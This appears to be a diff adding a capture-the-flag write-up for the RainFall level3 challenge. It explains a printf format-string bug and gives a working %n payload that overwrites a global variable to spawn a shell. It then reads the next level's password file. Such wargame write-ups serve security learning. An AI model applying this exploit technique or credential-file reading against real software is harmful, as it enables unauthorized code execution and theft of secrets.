@@ -1,0 +1,52 @@
+scp -P 4242 level3@RainFall:level3 <local_path>
+
+----------------------------------------------------------------------------------
+
+In ghidra we check the main function and we found v function:
+
+  void v() {                                                                    
+      char buf[0x208];                                                          
+      fgets(buf, 0x200, stdin);                                                 
+      printf(buf);                          // ← format string vuln             
+      if (m == 0x40)                        // m: global @ 0x0804988c           
+          system("/bin/sh");                                                    
+  }
+
+we can see that the bug is on printf(buf) instead of printf("%s", buf)
+
+----------------------------------------------------------------------------------
+
+To find the buffer exploitable stack position
+
+(echo 'AAAA %1$x %2$x %3$x %4$x %5$x %6$x %7$x %8$x' | ./level3)
+  ⎿  AAAA 200 e8005620 340 41414141 24312520 32252078 25207824 20782433       
+                 
+AAAA shows up at %4$ — so our buffer's first 4 bytes are the 4th variadic arg.
+
+----------------------------------------------------------------------------------
+
+Here %n will be our weapon
+
+If we print any number and then hit %4$n it will write the integer to the address 
+sitting at stack position 4. It means that we control postion 4 which is our buffer.
+We can write any value to any address.
+
+----------------------------------------------------------------------------------
+
+To build the payload step by step we'll write 0x40 (64) into m at address 0x0804988c
+
+\x8c\x98\x04\x08
+
+This is 4 characters printed and we need 64
+
+%60x		PRINTS THE VALUE AT POSITION 5, PADDED TO 60 CHARS widgets
+
+%4$n		WRITE WHAT PUT BEFORE INTO ADDRESS AT POSITION 4
+
+PAYLOAD: \x8c\x98\x04\x08 %60x %4$n
+
+(printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
+
+cat /home/user/level4/.pass
+
+cat /home/user/level4/.pass
